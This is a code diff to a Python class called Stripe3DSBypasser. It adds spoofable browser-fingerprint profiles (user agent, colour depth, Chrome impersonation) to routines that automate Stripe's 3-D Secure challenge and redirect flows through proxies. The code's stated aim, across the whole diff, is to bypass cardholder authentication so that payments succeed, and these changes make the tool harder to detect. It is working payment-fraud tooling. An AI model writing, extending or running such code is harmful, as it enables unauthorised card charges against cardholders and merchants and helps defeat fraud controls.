@@ -31,7 +31,7 @@ class Stripe3DSBypasser:
     # ── 3DS2 Native resolution (use_stripe_sdk) ──────────────────────────────
     @classmethod
     async def _resolve_3ds2_sdk(cls, session, next_action: dict,
-                                client_secret: str, pk_key: str) -> Optional[dict]:
+                                client_secret: str, pk_key: str, profile: dict = None) -> Optional[dict]:
         """
         Handle 3DS2 native SDK flow:
         1. Parse three_ds_2_intent_id / three_ds_method_url / three_ds_server_trans_id
@@ -63,7 +63,7 @@ class Stripe3DSBypasser:
                     data=urlencode({"threeDSMethodData": method_data_b64}),
                     headers={
                         "Content-Type": "application/x-www-form-urlencoded",
-                        "User-Agent": UA,
+                        "User-Agent": (profile or {}).get("user_agent", UA),
                     },
                     timeout=8,
                 ) as r:
@@ -79,10 +79,10 @@ class Stripe3DSBypasser:
             "threeDSServerTransID": server_trans_id,
             "browserJavaEnabled": False,
             "browserJavascriptEnabled": True,
-            "browserLanguage": "en-US",
-            "browserColorDepth": "24",
-            "browserTZ": "-300",
-            "browserUserAgent": UA,
+            "browserLanguage": "en-US", # Can refine later
+            "browserColorDepth": str((profile or {}).get("color_depth", "24")),
+            "browserTZ": "-300", # Need to pass timezone if possible, default to US Eastern
+            "browserUserAgent": (profile or {}).get("user_agent", UA),
         }
         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
         source_id = (
@@ -100,7 +100,7 @@ class Stripe3DSBypasser:
         }
         hdr = {
             "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": UA,
+            "User-Agent": (profile or {}).get("user_agent", UA),
             "Origin": "https://js.stripe.com",
             "Referer": "https://js.stripe.com/",
         }
@@ -126,7 +126,7 @@ class Stripe3DSBypasser:
 
         # Step 3: Check PaymentIntent status
         if pi_id:
-            return await cls._check_pi_status(session, pi_id, client_secret, pk_key)
+            return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile)
 
         return None
 
@@ -134,7 +134,7 @@ class Stripe3DSBypasser:
     @classmethod
     async def _resolve_redirect_url(cls, session, redirect_url: str,
                                     pi_id: str, client_secret: str,
-                                    pk_key: str) -> Optional[dict]:
+                                    pk_key: str, profile: dict = None) -> Optional[dict]:
         """
         Handle 3DS redirect flow:
         1. Follow redirect_url (https://hooks.stripe.com/redirect/authenticate/...)
@@ -149,7 +149,7 @@ class Stripe3DSBypasser:
             # Step 1: GET Stripe redirect page
             async with session.get(
                 redirect_url,
-                headers={"User-Agent": UA, "Accept": "text/html,*/*"},
+                headers={"User-Agent": (profile or {}).get("user_agent", UA), "Accept": "text/html,*/*"},
                 timeout=10,
                 allow_redirects=True,
             ) as r:
@@ -185,7 +185,7 @@ class Stripe3DSBypasser:
                     data=urlencode(form_data),
                     headers={
                         "Content-Type": "application/x-www-form-urlencoded",
-                        "User-Agent": UA,
+                        "User-Agent": (profile or {}).get("user_agent", UA),
                     },
                     timeout=10,
                     allow_redirects=True,
@@ -207,7 +207,7 @@ class Stripe3DSBypasser:
                         if c_data:
                             async with session.post(
                                 c_url, data=urlencode(c_data),
-                                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
+                                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": (profile or {}).get("user_agent", UA)},
                                 timeout=8, allow_redirects=True
                             ) as ret_res:
                                 pass
@@ -216,12 +216,12 @@ class Stripe3DSBypasser:
             pass
 
         # Step 4: Verify final status
-        return await cls._check_pi_status(session, pi_id, client_secret, pk_key)
+        return await cls._check_pi_status(session, pi_id, client_secret, pk_key, profile)
 
     # ── Check PaymentIntent Status ──────────────────────────────────────────
     @classmethod
     async def _check_pi_status(cls, session, pi_id: str,
-                               client_secret: str, pk_key: str) -> Optional[dict]:
+                               client_secret: str, pk_key: str, profile: dict = None) -> Optional[dict]:
         """Fetch PaymentIntent status from Stripe API."""
         if not pi_id or not client_secret:
             return None
@@ -229,7 +229,7 @@ class Stripe3DSBypasser:
         endpoint = "setup_intents" if "seti_" in pi_id else "payment_intents"
         url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}?client_secret={client_secret}&key={pk_key}"
         hdr = {
-            "User-Agent": UA,
+            "User-Agent": (profile or {}).get("user_agent", UA),
             "Accept": "application/json",
             "Origin": "https://js.stripe.com",
         }
@@ -250,7 +250,7 @@ class Stripe3DSBypasser:
 
     # ── Public Resolver Entry ───────────────────────────────────────────────
     @classmethod
-    async def resolve_3ds(cls, result: dict, proxy_data: Optional[dict] = None) -> dict:
+    async def resolve_3ds(cls, result: dict, proxy_data: Optional[dict] = None, profile: Optional[dict] = None) -> dict:
         """
         Public resolver method.
         Inspects result dict for next_action / PaymentIntent, attempts 3DS bypass.
@@ -281,15 +281,16 @@ class Stripe3DSBypasser:
             proxies = {"http": purl, "https": purl}
 
         try:
-            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
+            prof = profile or {"impersonate": "chrome131"}
+            async with ChromeSession(impersonate=prof.get("impersonate", "chrome131"), proxies=proxies, timeout=12) as sess:
                 act_type = next_action.get('type')
                 outcome = None
 
                 if act_type == 'use_stripe_sdk' or 'use_stripe_sdk' in next_action:
-                    outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key)
+                    outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key, profile)
                 elif act_type == 'redirect_to_url':
                     redirect_url = next_action.get('redirect_to_url', {}).get('url')
-                    outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key)
+                    outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key, profile)
 
                 if outcome and outcome.get('success'):
                     result['success'] = True
